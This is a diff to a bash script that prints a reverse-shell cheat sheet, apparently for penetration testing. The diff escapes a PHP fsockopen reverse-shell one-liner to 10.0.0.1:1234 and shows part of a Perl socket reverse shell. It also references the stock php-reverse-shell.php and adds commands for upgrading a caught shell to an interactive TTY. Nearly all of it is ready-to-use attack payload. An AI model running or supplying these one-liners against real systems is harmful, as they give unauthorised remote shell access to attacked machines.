@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Adjust the "=." strings based on n cols
+# Adjust the "=" strings length based on n cols
 s=$(printf "%-$(tput cols)s" "=")
 LINE=$(echo "${s// /=}")
 
@@ -37,7 +37,7 @@ echo "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,g
 # PHP
 echo -e "\n${BGRED}${BLINK}PHP${END}"
 echo "$LINE"
-echo "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+echo "php -r '\$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 echo ""
 
 # Compilation of reverse shells
@@ -46,4 +46,15 @@ echo -e "\n=*= Common Reverse Shells =*=\n"
 echo -e "\n${BGRED}${BLINK}PHP-REVERSE-SHELL${END}"
 echo "$LINE"
 echo "cp /usr/share/webshells/php/php-reverse-shell.php ."
+
 echo ""
+# Stablize Shell
+echo -e "\n=*= Stablize Reverse Shell =*=\n"
+echo -e "\n${BGRED}${BLINK}TTY${END}"
+echo "$LINE"
+echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+echo "/usr/bin/script -qc /bin/bash /dev/null"
+echo "export TERM=xterm"
+echo ""
+
